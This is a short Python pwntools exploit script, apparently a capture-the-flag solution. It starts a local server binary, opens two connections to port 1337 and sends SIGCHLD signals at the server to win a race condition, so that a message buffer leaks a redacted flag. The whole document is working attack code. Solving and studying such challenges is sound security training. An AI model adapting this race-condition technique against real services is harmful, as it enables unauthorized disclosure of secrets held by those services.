#!/bin/python

from pwn import *
from os  import *
import time
import signal

context.log_level = 'info'

REDACTED_STR = "REDACTED: " 
REDACTED_LEN = len(REDACTED_STR)

argv = ['nice', '-n19', sys.argv[1]]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

server = process(argv)

def get_remote():
    return remote("localhost", 1337)

msg_thd  = get_remote()
flag_thd = get_remote()

flag_thd.sendline(b"send_redacted_flag")
for _ in range(REDACTED_LEN):
    flag_thd.sendline(b"0")

msg_thd.sendline(b"send_message")
msg_thd.sendline(cyclic(20))

for _ in range(5):
    kill(server.pid, signal.SIGCHLD)

for _ in range(REDACTED_LEN+2):
    msg_thd.sendline(b"0")

for _ in range(55+3):
    flag_thd.sendline(b"0")

flag_thd.sendline(b"receive_message")
flag_thd.interactive()
   
exit(0)
